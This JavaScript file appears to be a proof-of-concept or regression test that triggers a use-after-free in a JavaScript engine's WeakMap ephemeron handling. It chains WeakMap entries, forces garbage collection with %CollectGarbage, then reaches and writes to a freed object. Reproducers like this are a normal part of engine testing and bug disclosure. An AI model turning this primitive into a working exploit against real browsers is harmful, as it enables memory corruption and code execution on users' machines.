var g_map = new WeakMap();
var kwm = {};
var k4 = {k: 4};

function get_uaf(map, key, kwm) {
  let innerMap = map.get(kwm);
  let k3 = innerMap.get(key);
  let v3 = innerMap.get(k3); // v3 = k1
  let uaf = map.get(v3); // v1

  return uaf;
}

function build_ephemerons(map) {
    var v2 = {v: 2};
    var k2 = {k: 2};

    var k1 = {k: 1};
    var v1 = {v: 1};

    var v3 = k1;
    var k3 = {k: 3};

    map.set(k1, v1); // E1
    map.set(k2, v2); // E2

    // Create a connection to innerMap
    var innerMap = new WeakMap();
    map.set(kwm, innerMap);

    innerMap.set(k3, v3) // E3
    innerMap.set(k4, k3); // E4
}

build_ephemerons(g_map);
%CollectGarbage(null);

let uaf = get_uaf(g_map, k4, kwm);
uaf.v = 123123;
